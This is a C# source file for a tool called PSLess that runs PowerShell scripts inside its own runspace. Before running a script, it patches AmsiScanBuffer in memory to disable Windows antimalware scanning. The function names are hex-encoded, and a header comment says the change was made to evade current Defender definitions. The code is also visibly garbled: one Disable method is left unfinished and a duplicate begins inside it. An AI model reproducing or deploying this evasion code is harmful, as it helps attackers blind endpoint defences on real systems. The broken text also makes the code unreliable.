//2019-04-13 addded quick&dirty fix in order to bypass latest Defender definitions and new AMSI bypass
//https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System;
using System.Text;
using System.Runtime.InteropServices;
namespace PSLess
{
   
    class PSLess
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
      
       
	
       public static int Disable()
          {
            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
	    string buffer="";
	    string[] hexbuffersplit = hexbuffer.Split(' ');
	public static int Disable()
        {
            string hexbuffer = "41;6d;73;69;53;63;61;6e;42;75;66;66;65;72";
            string hexdllbuffer = "61;6d;73;69;2e;64;6c;6c";

            string buf1=FromHexBuffer(hexdllbuffer);
            string buf2=FromHexBuffer(hexbuffer);
            IntPtr Address = GetProcAddress(LoadLibrary(buf1), buf2);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            byte c1=0xB8,c2=0x80;

            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
        }

        public static string FromHexBuffer(String hexdata)
        {
            string buffer="";
            String[] hexbuffersplit = hexdata.Split(';');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer+= Char.ConvertFromUtf32(value);
            }

            return buffer;
        }      
       static void Main(string[] args)
        {
            if (args.Length == 0)
                Environment.Exit(1);
            string script = LoadScript(args[0]);
            string s = RunScript(script);
            Console.WriteLine(s);
            Console.ReadKey();
        }
        private static string LoadScript(string filename)
        {
            string buffer = "";
            try
            {
                buffer = File.ReadAllText(filename);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Environment.Exit(2);
            }
            return buffer;
        }
        private static string RunScript(string script)
        {
            Runspace MyRunspace = RunspaceFactory.CreateRunspace();
            MyRunspace.Open();
            Disable();
            Pipeline MyPipeline = MyRunspace.CreatePipeline();
            MyPipeline.Commands.AddScript(script);
            MyPipeline.Commands.Add("Out-String");
            Collection<PSObject> outputs = MyPipeline.Invoke();
            MyRunspace.Close();
            StringBuilder sb = new StringBuilder();
            foreach (PSObject pobject in outputs)
            {
                sb.AppendLine(pobject.ToString());
            }
            return sb.ToString();
        }
    }
}
